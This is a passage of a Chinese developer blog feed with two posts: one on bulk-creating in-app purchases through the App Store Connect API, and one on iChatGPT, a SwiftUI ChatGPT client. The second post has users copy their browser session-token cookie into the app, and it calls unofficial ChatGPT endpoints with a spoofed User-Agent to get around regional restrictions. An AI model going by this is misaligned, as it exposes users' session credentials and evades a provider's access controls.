&#123;</span><br><span class="line">    <span class="keyword">let</span> body <span class="operator">=</span> [</span><br><span class="line">        <span class="string">&quot;data&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;attributes&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;availableInAllTerritories&quot;</span>: product.availableInAllTerritories,</span><br><span class="line">                <span class="string">&quot;familySharable&quot;</span>: product.familySharable,</span><br><span class="line">                <span class="comment">// CONSUMABLE、NON_CONSUMABLE、NON_RENEWING_SUBSCRIPTION</span></span><br><span class="line">                <span class="string">&quot;inAppPurchaseType&quot;</span>: product.inAppPurchaseType.rawValue,</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: product.name,</span><br><span class="line">                <span class="string">&quot;productId&quot;</span>: product.productId,</span><br><span class="line">                <span class="string">&quot;reviewNote&quot;</span>: product.reviewNote,</span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;relationships&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;app&quot;</span>: [</span><br><span class="line">                    <span class="string">&quot;data&quot;</span>: [</span><br><span class="line">                        <span class="string">&quot;id&quot;</span>: appId,</span><br><span class="line">                        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;apps&quot;</span></span><br><span class="line">                    ]</span><br><span class="line">                ]</span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;inAppPurchases&quot;</span></span><br><span class="line">        ]</span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">guard</span> <span class="keyword">let</span> provider <span class="operator">=</span> provider <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> json <span class="operator">=</span> <span class="keyword">try</span> <span class="type">JSONSerialization</span>.data(withJSONObject: body, options: .prettyPrinted)</span><br><span class="line">        <span class="keyword">let</span> model <span class="operator">=</span> <span class="keyword">try</span> <span class="type">JSONDecoder</span>().decode(<span class="type">InAppPurchaseV2CreateRequest</span>.<span class="keyword">self</span>, from: json)</span><br><span class="line">        <span class="keyword">let</span> request <span class="operator">=</span> <span class="type">APIEndpoint</span>.v2.inAppPurchases.post(model)</span><br><span class="line">        <span class="keyword">let</span> data <span class="operator">=</span> <span class="keyword">try</span> <span class="keyword">await</span> provider.request(request).data</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    &#125; <span class="keyword">catch</span> <span class="type">APIProvider</span>.<span class="type">Error</span>.requestFailure(<span class="keyword">let</span> statusCode, <span class="keyword">let</span> errorResponse, <span class="keyword">_</span>) &#123;</span><br><span class="line">        handleRequestFailure(statusCode, errorResponse)</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">        handleError(<span class="string">&quot;创建内购商品失败: <span class="subst">\(error.localizedDescription)</span>&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就不再展开，详细可以参考我们开源项目代码：<a href="https://github.com/37iOS/AppleParty/blob/main/AppleParty/Shared/Network/AppStoreConnectAPI.swift">AppStoreConnectAPI.swift</a>。</p><h3 id="3、Apple-Party（苹果派）更新"><a href="#3、Apple-Party（苹果派）更新" class="headerlink" title="3、Apple Party（苹果派）更新"></a>3、Apple Party（苹果派）更新</h3><p>下载 2.1.0 更新版本：<a href="https://github.com/37iOS/AppleParty/releases">Releases · 37iOS/AppleParty</a></p><p><strong>更新重点内容</strong></p><ul><li>截图不再是必需项</li><li>支持多种本地化语言</li></ul><p>表格格式更新，删除无法字段，支持多种本地化语言：<br><img src="https://ihtcboy.com/images/2022-AppStoreConnectAPI-05.png" alt="AppStoreConnectAPI-05"></p><blockquote><p>支持多种本地化语言，通过在表格最后的列增加，本地化语言标识，每种语言增加2列，分别对应本地化的名字和描述。</p></blockquote><p>内购列表更新支持不同的价格国家地区的价格显示：<br><img src="https://ihtcboy.com/images/2022-AppStoreConnectAPI-06.png" alt="AppStoreConnectAPI-06"></p><p>导入表格后，首次需要设置 API 密钥：<br><img src="https://ihtcboy.com/images/2022-AppStoreConnectAPI-07.png" alt="AppStoreConnectAPI-07"></p><p>密钥获取，参考本文的第二章内容。<br><img src="https://ihtcboy.com/images/2022-AppStoreConnectAPI-08.png" alt="AppStoreConnectAPI-08"></p><p>提交后，会自动执行上传，如果存在的商品会更新内容，成功时：<br><img src="https://ihtcboy.com/images/2022-AppStoreConnectAPI-09.png" alt="AppStoreConnectAPI-09"></p><h3 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h3><p>App Store Connect API 功能非常多，包括元数据的管理，构建版本的管理、TextFlight 管理、证书管理等等，Apple Party（苹果派）从日常使用场景最多的内购商品批量创建入手，未来依然有非常多的生效力效率提升，欢迎大家一起迭代和 PR 提交！</p><p>欢迎你一起体验和参考 <a href="https://github.com/37iOS/AppleParty">37iOS/AppleParty</a>~</p><p>欢迎大家评论区一起讨论交流~</p><blockquote><p>欢迎关注我们，了解更多 iOS 和 Apple 的动态~</p></blockquote><h3 id="参考引用"><a href="#参考引用" class="headerlink" title="参考引用"></a>参考引用</h3><ul><li><a href="https://developer.apple.com/cn/news/?id=yqf4kgwb">即将从 XML Feed 过渡到 App Store Connect API - 最新动态 - Apple Developer</a></li><li><a href="https://help.apple.com/app-store-connect/#/deve5f9a89d7">职能权限 - App Store Connect 帮助</a></li><li><a href="https://developer.apple.com/documentation/appstoreconnectapi/revoking_api_keys">Revoking API Keys | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/appstoreconnectapi/create_an_in-app_purchase">Create an In-App Purchase | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/appstoreconnectapi/create_an_auto-renewable_subscription">Create an Auto-Renewable Subscription | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/appstoreconnectapi/uploading_assets_to_app_store_connect">Uploading Assets to App Store Connect | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/appstoreconnectapi/create_an_in-app_purchase_review_screenshot">Create an In-App Purchase Review Screenshot | Apple Developer Documentation</a></li><li><a href="https://github.com/AvdLee/appstoreconnect-swift-sdk">AvdLee/appstoreconnect-swift-sdk: The Swift SDK to work with the App Store Connect API from Apple.</a></li><li><a href="https://github.com/37iOS/AppleParty/releases">Releases · 37iOS/AppleParty</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文首发于 &lt;a href=&quot;https://juejin.cn/post/7181099247956131896&quot;&gt;使用 App Store Connect API 批量创建内购商品 - 掘金&lt;/a&gt;，欢迎关注我们 &lt;a href=&quot;https://juejin.cn/user/1002387318511214&quot;&gt;@37手游iOS技术运营团队&lt;/a&gt; 。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;作者：iHTCboy&lt;/p&gt;
&lt;p&gt;我们去年开源 &lt;a href=&quot;https://juejin.cn/post/7081069026515877919&quot;&gt;AppleParty（苹果派）&lt;/a&gt; 用于批量应用内购商品的创建和更新的方案，具体的技术方案是使用 XML Feed 格式来处理。而今年苹果在 WWDC22 宣布，2022 年 11 月开始，不再允许使用 XML 方式上传元数据和内购商品。&lt;/p&gt;</summary>
    
    
    
    <category term="technology" scheme="https://ihtcboy.com/categories/technology/"/>
    
    
    <category term="批量创建内购" scheme="https://ihtcboy.com/tags/%E6%89%B9%E9%87%8F%E5%88%9B%E5%BB%BA%E5%86%85%E8%B4%AD/"/>
    
    <category term="App Store Connect API" scheme="https://ihtcboy.com/tags/App-Store-Connect-API/"/>
    
    <category term="In App Purchase" scheme="https://ihtcboy.com/tags/In-App-Purchase/"/>
    
  </entry>
  
  <entry>
    <title>用 SwiftUI 实现 AI 聊天对话 app - iChatGPT</title>
    <link href="https://ihtcboy.com/2022/12/09/2022-12-09_%E7%94%A8SwiftUI%E5%AE%9E%E7%8E%B0ChatGPT%E4%B8%80%E4%B8%AAAI%E8%81%8A%E5%A4%A9%E5%AF%B9%E8%AF%9D%20app/"/>
    <id>https://ihtcboy.com/2022/12/09/2022-12-09_%E7%94%A8SwiftUI%E5%AE%9E%E7%8E%B0ChatGPT%E4%B8%80%E4%B8%AAAI%E8%81%8A%E5%A4%A9%E5%AF%B9%E8%AF%9D%20app/</id>
    <published>2022-12-09T07:43:10.000Z</published>
    <updated>2022-12-31T15:34:58.584Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发于 <a href="https://juejin.cn/post/7175051294808211512">用 SwiftUI 实现 AI 聊天对话 app - iChatGPT - 掘金</a>，欢迎关注我们 <a href="https://juejin.cn/user/1002387318511214">@37手游iOS技术运营团队</a> 。</p></blockquote><p>作者：iHTCboy</p><p>关于 ChatGPT 的话题，大家都不陌生，我们直入话题，因为 ChatGPT 目前限制中国访问服务，所以如果直接使用 ChatGPT 网页进行对话，还是不太方便。通过 ChatGPT SessionToken 就可以不限制网络访问，所以大家发挥想象力实现各种的聊天机器人、小程序，而原生 app 可能体验更好！所以就有了 iChatGPT！一款用 SwiftUI 实现的开源 ChatGPT app，欢迎大家关注和 pr。</p><span id="more"></span><p><img src="https://ihtcboy.com/images/2022-iChatGPT-01.jpeg" alt="iChatGPT-01"></p><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>关于 ChatGPT 的话题，大家都不陌生，我们直入话题，因为 ChatGPT 目前限制中国访问服务，所以如果直接使用 ChatGPT 网页进行对话，还是不太方便。通过 ChatGPT SessionToken 就可以不限制网络访问，所以大家发挥想象力实现各种的聊天机器人、小程序，而原生 app 可能体验更好！所以就有了 iChatGPT！一款用 SwiftUI 实现的开源 ChatGPT app，欢迎大家关注和 pr。</p><h3 id="二、iChatGPT"><a href="#二、iChatGPT" class="headerlink" title="二、iChatGPT"></a>二、iChatGPT</h3><p>GitHub 开源地址：<a href="https://github.com/37iOS/iChatGPT">https://github.com/37iOS/iChatGPT</a></p><p>目前 v1.0.0，实现 ChatGPT 基本聊天功能：</p><ul><li>可以直接与 ChatGPT 对话，并且保留上下文；</li><li>可以复制问题和回答内容；</li><li>可以快捷重复提问等</li></ul><p>支持系统：</p><ul><li>iOS 14.0+</li><li>iPadOS 14.0+</li><li>macOS 11.0+</li></ul><h3 id="三、App-使用介绍"><a href="#三、App-使用介绍" class="headerlink" title="三、App 使用介绍"></a>三、App 使用介绍</h3><p><img src="https://ihtcboy.com/images/2022-iChatGPT-02.jpeg" alt="iChatGPT-02"></p><p>首先，需要点击 app 右上角图标，添加 <code>ChatGPT SessionToken</code> 密钥才能使用，否则无法请求。</p><p><img src="https://ihtcboy.com/images/2022-iChatGPT-03.jpeg" alt="iChatGPT-03"></p><p>获取 <code>SessionToken</code> 的方法很多，其中浏览器方法：</p><ol><li>登录 <a href="https://chat.openai.com/chat">https://chat.openai.com/chat</a></li><li>按 F12 打开控制台（macOS 可以用快捷键 <code>command + option + I</code> ）</li><li>切换到 Application(应用) 选项卡，找到 Cookies （Safari 浏览器是 <code>储存空间</code> 选项卡）</li><li>复制 <code>__Secure-next-auth.session-token</code> 的值，添加到 app 后确认。</li></ol><p><img src="https://ihtcboy.com/images/2022-iChatGPT-04.jpeg" alt="iChatGPT-04"></p><p>iOS 操作的界面：<br><img src="https://ihtcboy.com/images/2022-iChatGPT-05.jpeg" alt="iChatGPT-05"></p><p>macOS 操作的界面：<br><img src="https://ihtcboy.com/images/2022-iChatGPT-06.jpeg" alt="iChatGPT-06"></p><h3 id="四、App-实现介绍"><a href="#四、App-实现介绍" class="headerlink" title="四、App 实现介绍"></a>四、App 实现介绍</h3><p>使用 SwiftUI 大概几个小时就完成所有的工作，方便跟苹果生态实现。实现的难点就可能就是模拟 ChatGPT 请求过程。目前是根据 <a href="https://github.com/A-kirami/nonebot-plugin-chatgpt">A-kirami/nonebot-plugin-chatgpt</a> 项目中的 python 实现，用 Swift 重写了一次，而 ChatGPT 登陆暂时没有实现，大家可以提 pr。</p><p>最后封装的网络请求类 <a href="https://github.com/37iOS/iChatGPT/blob/main/iChatGPT/Models/ChatGPT.swift">ChatGPT.swift</a> </p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chatbot</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> apUrl <span class="operator">=</span> <span class="string">&quot;https://chat.openai.com/&quot;</span></span><br><span class="line"><span class="keyword">let</span> sessionTokenKey <span class="operator">=</span> <span class="string">&quot;__Secure-next-auth.session-token&quot;</span></span><br><span class="line"><span class="keyword">let</span> timeout <span class="operator">=</span> <span class="number">30</span></span><br><span class="line"><span class="keyword">var</span> sessionToken: <span class="type">String</span></span><br><span class="line"><span class="keyword">var</span> authorization <span class="operator">=</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">var</span> conversationId <span class="operator">=</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">var</span> parentId <span class="operator">=</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">let</span>  id <span class="operator">=</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">init</span>(<span class="params">sessionToken</span>: <span class="type">String</span>)</span> &#123;</span><br><span class="line"><span class="keyword">self</span>.sessionToken <span class="operator">=</span> sessionToken</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">headers</span>()</span> -&gt; [<span class="type">String</span>: <span class="type">String</span>] &#123;</span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line"><span class="string">&quot;Host&quot;</span>: <span class="string">&quot;chat.openai.com&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/event-stream&quot;</span>,</span><br><span class="line"><span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;Bearer <span class="subst">\(<span class="keyword">self</span>.authorization)</span>&quot;</span>,</span><br><span class="line"><span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line"><span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15&quot;</span>,</span><br><span class="line"><span class="string">&quot;X-Openai-Assistant-App-Id&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line"><span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;en-US,en;q=0.9&quot;</span>,</span><br><span class="line"><span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://chat.openai.com/chat&quot;</span>,</span><br><span class="line">]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getPayload</span>(<span class="params">prompt</span>: <span class="type">String</span>)</span> -&gt; [<span class="type">String</span>: <span class="keyword">Any</span>] &#123;</span><br><span class="line"><span class="keyword">var</span> body <span class="operator">=</span> [</span><br><span class="line"><span class="string">&quot;action&quot;</span>: <span class="string">&quot;next&quot;</span>,</span><br><span class="line"><span class="string">&quot;messages&quot;</span>: [</span><br><span class="line">[</span><br><span class="line"><span class="string">&quot;id&quot;</span>: <span class="string">&quot;<span class="subst">\(UUID().uuidString)</span>&quot;</span>,</span><br><span class="line"><span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line"><span class="string">&quot;content&quot;</span>: [<span class="string">&quot;content_type&quot;</span>: <span class="string">&quot;text&quot;</span>, <span class="string">&quot;parts&quot;</span>: [prompt]],</span><br><span class="line">]</span><br><span class="line">],</span><br><span class="line"><span class="string">&quot;parent_message_id&quot;</span>: <span class="string">&quot;<span class="subst">\(<span class="keyword">self</span>.parentId)</span>&quot;</span>,</span><br><span class="line"><span class="string">&quot;model&quot;</span>: <span class="string">&quot;text-davinci-002-render&quot;</span>,</span><br><span class="line">] <span class="keyword">as</span> [<span class="type">String</span>: <span class="keyword">Any</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="operator">!</span><span class="keyword">self</span>.conversationId.isEmpty &#123;</span><br><span class="line">body[<span class="string">&quot;conversation_id&quot;</span>] <span class="operator">=</span> <span class="keyword">self</span>.conversationId</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> body</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">refreshSession</span>()</span> <span class="keyword">async</span> &#123;</span><br><span class="line"><span class="keyword">let</span> cookies <span class="operator">=</span> <span class="string">&quot;<span class="subst">\(sessionTokenKey)</span>=<span class="subst">\(<span class="keyword">self</span>.sessionToken)</span>&quot;</span></span><br><span class="line"><span class="keyword">let</span> url <span class="operator">=</span> <span class="keyword">self</span>.apUrl <span class="operator">+</span> <span class="string">&quot;api/auth/session&quot;</span></span><br><span class="line"><span class="keyword">let</span> userAgent <span class="operator">=</span> <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15&quot;</span></span><br><span class="line"><span class="keyword">var</span> request <span class="operator">=</span> <span class="type">URLRequest</span>(url: <span class="type">URL</span>(string: url)<span class="operator">!</span>)</span><br><span class="line">request.httpMethod <span class="operator">=</span> <span class="string">&quot;GET&quot;</span></span><br><span class="line">request.addValue(userAgent, forHTTPHeaderField: <span class="string">&quot;User-Agent&quot;</span>)</span><br><span class="line">request.addValue(cookies, forHTTPHeaderField: <span class="string">&quot;Cookie&quot;</span>)</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="keyword">let</span> (data, response) <span class="operator">=</span> <span class="keyword">try</span> <span class="keyword">await</span> <span class="type">URLSession</span>.shared.data(for: request)</span><br><span class="line"><span class="keyword">let</span> json <span class="operator">=</span> <span class="keyword">try</span> <span class="type">JSONSerialization</span>.jsonObject(with: data, options: [])</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">let</span> dictionary <span class="operator">=</span> json <span class="keyword">as?</span> [<span class="type">String</span>: <span class="keyword">Any</span>] &#123;</span><br><span class="line"><span class="comment">// Use the dictionary here</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">let</span> accessToken <span class="operator">=</span> dictionary[<span class="string">&quot;accessToken&quot;</span>] <span class="keyword">as?</span> <span class="type">String</span> &#123;</span><br><span class="line">authorization <span class="operator">=</span> accessToken</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">guard</span> <span class="keyword">let</span> response <span class="operator">=</span> response <span class="keyword">as?</span> <span class="type">HTTPURLResponse</span>,</span><br><span class="line">  <span class="keyword">let</span> cookies <span class="operator">=</span> <span class="type">HTTPCookieStorage</span>.shared.cookies(for: response.url<span class="operator">!</span>) <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// handle error</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;刷新会话失败: &lt;r&gt;HTTP:<span class="subst">\(response)</span>&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> cookie <span class="keyword">in</span> cookies &#123;</span><br><span class="line"><span class="keyword">if</span> cookie.name <span class="operator">==</span> sessionTokenKey &#123;</span><br><span class="line"><span class="keyword">self</span>.sessionToken <span class="operator">=</span> cookie.value</span><br><span class="line">                    <span class="type">UserDefaults</span>.standard.set(cookie.value, forKey: <span class="type">ChatGPTSessionTokenKey</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> &#123;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;刷新会话失败: &lt;r&gt;HTTP:<span class="subst">\(error)</span>&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getChatResponse</span>(<span class="params">prompt</span>: <span class="type">String</span>)</span> <span class="keyword">async</span> -&gt; <span class="type">String</span> &#123;</span><br><span class="line"><span class="keyword">if</span>  <span class="keyword">self</span>.authorization.isEmpty &#123;</span><br><span class="line"><span class="keyword">await</span> refreshSession()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> url <span class="operator">=</span> <span class="keyword">self</span>.apUrl <span class="operator">+</span> <span class="string">&quot;backend-api/conversation&quot;</span></span><br><span class="line"><span class="keyword">var</span> request <span class="operator">=</span> <span class="type">URLRequest</span>(url: <span class="type">URL</span>(string: url)<span class="operator">!</span>)</span><br><span class="line">request.httpMethod <span class="operator">=</span> <span class="string">&quot;POST&quot;</span></span><br><span class="line">request.allHTTPHeaderFields <span class="operator">=</span> headers()</span><br><span class="line"><span class="keyword">let</span> dict <span class="operator">=</span> getPayload(prompt: prompt)</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="keyword">let</span> jsonData <span class="operator">=</span> <span class="keyword">try</span> <span class="type">JSONSerialization</span>.data(withJSONObject: dict, options: [])</span><br><span class="line">request.httpBody <span class="operator">=</span> jsonData</span><br><span class="line"><span class="keyword">let</span> (data, response) <span class="operator">=</span> <span class="keyword">try</span> <span class="keyword">await</span> <span class="type">URLSession</span>.shared.data(for: request)</span><br><span class="line"><span class="keyword">guard</span> <span class="keyword">let</span> response <span class="operator">=</span> response <span class="keyword">as?</span> <span class="type">HTTPURLResponse</span> <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">let</span> err <span class="operator">=</span> <span class="string">&quot;非预期的响应内容:  &lt;r&gt;HTTP:<span class="subst">\(response)</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(err)</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response.statusCode <span class="operator">==</span> <span class="number">429</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;请求过多，请放慢速度&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">guard</span> <span class="keyword">let</span> text <span class="operator">=</span> <span class="type">String</span>(data: data, encoding: .utf8) <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;非预期的响应内容: 内容读取失败~&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> response.statusCode <span class="operator">!=</span> <span class="number">200</span> &#123;</span><br><span class="line">                <span class="keyword">let</span> err <span class="operator">=</span> <span class="string">&quot;非预期的响应内容:  &lt;r&gt;HTTP:<span class="subst">\(response.statusCode)</span>&lt;/r&gt; <span class="subst">\(text)</span>&quot;</span></span><br><span class="line">                <span class="built_in">print</span>(err)</span><br><span class="line">                <span class="keyword">return</span> err</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line"><span class="keyword">let</span> lines <span class="operator">=</span> text.components(separatedBy: <span class="string">&quot;<span class="subst">\n</span>&quot;</span>)</span><br><span class="line"><span class="comment">// 倒数第四行，第6个字符后开始</span></span><br><span class="line"><span class="keyword">let</span> str <span class="operator">=</span> lines[lines.count <span class="operator">-</span> <span class="number">5</span>]</span><br><span class="line">            <span class="keyword">#if</span> <span class="type">DEBUG</span></span><br><span class="line"><span class="built_in">print</span>(str)</span><br><span class="line">            <span class="keyword">#endif</span></span><br><span class="line"><span class="keyword">let</span> jsonString <span class="operator">=</span> str.suffix(from: str.index(str.startIndex, offsetBy: <span class="number">6</span>))</span><br><span class="line"><span class="keyword">guard</span> <span class="keyword">let</span> jsondata <span class="operator">=</span> jsonString.data(using: .utf8) <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> json <span class="operator">=</span> <span class="keyword">try</span> <span class="type">JSONSerialization</span>.jsonObject(with: jsondata, options: [])</span><br><span class="line"><span class="keyword">guard</span> <span class="keyword">let</span> dictionary <span class="operator">=</span> json <span class="keyword">as?</span> [<span class="type">String</span>: <span class="keyword">Any</span>],</span><br><span class="line"><span class="keyword">let</span> conversation_id <span class="operator">=</span> dictionary[<span class="string">&quot;conversation_id&quot;</span>] <span class="keyword">as?</span> <span class="type">String</span>,</span><br><span class="line"><span class="keyword">let</span> message <span class="operator">=</span> dictionary[<span class="string">&quot;message&quot;</span>] <span class="keyword">as?</span> [<span class="type">String</span>: <span class="keyword">Any</span>],</span><br><span class="line"><span class="keyword">let</span> parent_id <span class="operator">=</span> message[<span class="string">&quot;id&quot;</span>] <span class="keyword">as?</span> <span class="type">String</span>,</span><br><span class="line"><span class="keyword">let</span> content <span class="operator">=</span> message[<span class="string">&quot;content&quot;</span>] <span class="keyword">as?</span> [<span class="type">String</span>: <span class="keyword">Any</span>],</span><br><span class="line"><span class="keyword">let</span> texts <span class="operator">=</span> content[<span class="string">&quot;parts&quot;</span>] <span class="keyword">as?</span> [<span class="type">String</span>],</span><br><span class="line"><span class="keyword">let</span> parts <span class="operator">=</span> texts.last</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;解析错误~&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">self</span>.parentId <span class="operator">=</span> parent_id</span><br><span class="line"><span class="keyword">self</span>.conversationId <span class="operator">=</span> conversation_id</span><br><span class="line"><span class="keyword">return</span> parts</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;异常：<span class="subst">\(error)</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>唯一可以说说的就是，ChatGPT 的 <code>backend-api/conversation</code> 接口返回的内容，为了实现一个连接打开的效果，返回了一堆的数据。例如一个回答是 <code>&quot;我无法确定全球当前的人口数量，因为我没有浏览网页的能力。&quot;</code>，返回的内容是这样：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 